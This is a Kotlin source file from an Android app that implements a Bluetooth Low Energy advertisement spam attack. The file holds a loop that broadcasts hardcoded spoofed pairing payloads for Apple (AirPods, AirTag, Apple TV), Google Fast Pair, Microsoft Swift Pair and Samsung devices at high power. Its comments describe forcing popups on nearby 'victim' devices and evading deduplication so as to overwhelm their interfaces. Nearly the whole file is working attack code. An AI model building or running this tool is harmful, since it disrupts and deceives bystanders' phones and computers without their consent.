package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.os.ParcelUuid
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import java.util.UUID

/**
 * Data class representing a payload for the BLE Spam attack.
 *
 * @property type The ecosystem this payload targets (e.g., Apple, Google).
 * @property name A descriptive name for the payload (e.g., "AirPods Pro").
 * @property manufacturerId The Bluetooth SIG Manufacturer ID (e.g., 0x004C for Apple).
 * @property serviceUuid The Service UUID if the protocol relies on it (e.g., Google Fast Pair).
 * @property data The raw byte array to be included in the Manufacturer Data or Service Data field.
 */
data class SpamPayload(
    val type: PayloadType,
    val name: String,
    val manufacturerId: Int? = null,
    val serviceUuid: ParcelUuid? = null,
    val data: ByteArray = byteArrayOf()
)

/**
 * Enum defining the target ecosystems for the BLE advertisement spam.
 */
enum class PayloadType {
    APPLE_CONTINUITY,     // Targets iOS/macOS devices (popups for AirPods, AppleTV, etc.)
    GOOGLE_FAST_PAIR,     // Targets Android devices (popups for Pixel Buds, etc.)
    MICROSOFT_SWIFT_PAIR, // Targets Windows devices (popups for mice/keyboards)
    SAMSUNG_EASY_SETUP    // Targets Samsung devices (popups for Galaxy Buds/Watches)
}

/**
 * Module responsible for executing BLE Advertisement Spam attacks.
 *
 * This attack works by broadcasting specially crafted BLE Advertisement packets
 * that mimic legitimate pairing requests (e.g., "AirPods found near you").
 * This triggers annoying popup dialogs on nearby victim devices, acting as a
 * disruptive Denial of Service (DoS) or social engineering vector.
 *
 * @property context The application context, required to access system Bluetooth services.
 */
class BleSpamModule(private val context: Context) {

    // Access the system Bluetooth Adapter.
    private val bluetoothAdapter: BluetoothAdapter? = (context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
    // The advertiser object handles broadcasting packets.
    private var advertiser: BluetoothLeAdvertiser? = bluetoothAdapter?.bluetoothLeAdvertiser

    // State flow to track if the attack is currently active.
    private val _isAdvertising = MutableStateFlow(false)
    val isAdvertising: StateFlow<Boolean> = _isAdvertising

    // Coroutine job to manage the advertising loop.
    private var advertisingJob: Job? = null
    // Scope for background operations (IO).
    private val scope = CoroutineScope(Dispatchers.IO)

    // Callback to receive status updates from the BluetoothLeAdvertiser.
    private val advertiseCallback = object : AdvertiseCallback() {
        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
            super.onStartSuccess(settingsInEffect)
            Log.d("BleSpam", "Advertising started successfully")
        }

        override fun onStartFailure(errorCode: Int) {
            super.onStartFailure(errorCode)
            Log.e("BleSpam", "Advertising failed: $errorCode")
            // Note: Error 1 usually means data too large, Error 2 means too many advertisers.
        }
    }

    /**
     * Starts the spam attack with the specified payload type.
     *
     * @param payloadType The ecosystem to target (Apple, Google, etc.).
     */
    @SuppressLint("MissingPermission")
    fun startSpam(payloadType: PayloadType) {
        // Pre-flight check: Is Bluetooth on?
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            Log.e("BleSpam", "Bluetooth not enabled")
            return
        }

        // Refresh the advertiser instance (it might be null if BT was just turned on).
        advertiser = bluetoothAdapter.bluetoothLeAdvertiser
        if (advertiser == null) {
             Log.e("BleSpam", "BLE Advertiser not available")
             return
        }

        // Prevent multiple concurrent starts.
        if (_isAdvertising.value) return
        _isAdvertising.value = true

        // Generate the list of payloads to cycle through.
        val payloads = generatePayloads(payloadType)

        // Launch the advertising loop on a background thread.
        advertisingJob = scope.launch {
            while (_isAdvertising.value) {
                // To simulate MAC address rotation (privacy/evasion) and to bypass
                // OS-level deduplication on the victim's side, we stop and restart
                // advertising frequently. This forces the victim to treat each burst as a new device.

                payloads.forEach { payload ->
                    // Check cancellation signal.
                    if (!_isAdvertising.value) return@forEach

                    // Configure High Power, Low Latency settings for maximum range and speed.
                    val settings = AdvertiseSettings.Builder()
                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                        .setConnectable(false) // We don't want anyone to connect, just see the ad.
                        .build()

                    // Build the advertisement data.
                    val dataBuilder = AdvertiseData.Builder()
                        .setIncludeDeviceName(false) // Custom payloads usually omit the local name.
                        .setIncludeTxPowerLevel(false)

                    // Add Manufacturer Data (used by Apple/Microsoft/Samsung).
                    payload.manufacturerId?.let {
                        dataBuilder.addManufacturerData(it, payload.data)
                    }

                    // Add Service UUID (used by Google Fast Pair).
                    payload.serviceUuid?.let {
                        dataBuilder.addServiceUuid(it)
                        // Some protocols put the payload in Service Data instead of Manufacturer Data.
                        if (payload.data.isNotEmpty() && payload.manufacturerId == null) {
                             dataBuilder.addServiceData(it, payload.data)
                        }
                    }

                    val advertiseData = dataBuilder.build()

                    try {
                        Log.d("BleSpam", "Starting ad: ${payload.name}")
                        // Start broadcasting.
                        advertiser?.startAdvertising(settings, advertiseData, advertiseCallback)

                        // Advertise for a very short burst (160ms).
                        // This rapid switching helps in overwhelming the victim's UI logic.
                        delay(160)

                        // Stop broadcasting.
                        advertiser?.stopAdvertising(advertiseCallback)

                        // Short gap to avoid congestion.
                        delay(50)
                    } catch (e: Exception) {
                        Log.e("BleSpam", "Error in spam loop", e)
                    }
                }
            }
            // Ensure cleanup when loop exits.
            stopSpamInternal()
        }
    }

    /**
     * Stops the spam attack.
     */
    @SuppressLint("MissingPermission")
    fun stopSpam() {
        _isAdvertising.value = false
        advertisingJob?.cancel()
        stopSpamInternal()
    }

    /**
     * Internal helper to stop advertising safely.
     */
    @SuppressLint("MissingPermission")
    private fun stopSpamInternal() {
        try {
            advertiser?.stopAdvertising(advertiseCallback)
        } catch (e: Exception) {
            Log.e("BleSpam", "Error stopping advertising", e)
        }
    }

    /**
     * Generates a list of hardcoded payloads based on research/public exploits (e.g., Flipper Zero payloads).
     */
    private fun generatePayloads(type: PayloadType): List<SpamPayload> {
        return when (type) {
            PayloadType.APPLE_CONTINUITY -> listOf(
                // Apple - Airpods Pro spoof
                SpamPayload(type, "AirPods Pro", manufacturerId = 0x004C, data = byteArrayOf(0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa.toByte(), 0x30, 0x01, 0x00, 0x00, 0x45, 0x2d, 0x3a, 0x05, 0x25, 0x45, 0xce.toByte(), 0x93.toByte(), 0x9c.toByte(), 0x24, 0x12, 0x6e, 0x3d)),
                // Apple - AirTags (Simplified)
                SpamPayload(type, "AirTag", manufacturerId = 0x004C, data = byteArrayOf(0x12, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)),
                // Apple - Apple TV Setup
                SpamPayload(type, "Apple TV", manufacturerId = 0x004C, data = byteArrayOf(0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1.toByte(), 0x01, 0x60, 0x4c, 0x95.toByte(), 0x00, 0x00, 0x10, 0x00, 0x00, 0x00))
            )
            PayloadType.GOOGLE_FAST_PAIR -> listOf(
                // Generic Google Fast Pair trigger
                SpamPayload(type, "Google Fast Pair", serviceUuid = ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"), data = byteArrayOf(0x00, 0x00, 0x00, 0x00, 0x00, 0x00))
            )
            PayloadType.MICROSOFT_SWIFT_PAIR -> listOf(
                // Microsoft Swift Pair (Simplified) - 0x0006 is Microsoft's ID
                SpamPayload(type, "Swift Pair", manufacturerId = 0x0006, data = byteArrayOf(0x03, 0x00, 0x80.toByte()))
            )
             PayloadType.SAMSUNG_EASY_SETUP -> listOf(
                // Samsung - 0x0075 is Samsung's ID
                SpamPayload(type, "Samsung Buds", manufacturerId = 0x0075, data = byteArrayOf(0x42, 0x09, 0x81.toByte(), 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09))
            )
        }
    }
}
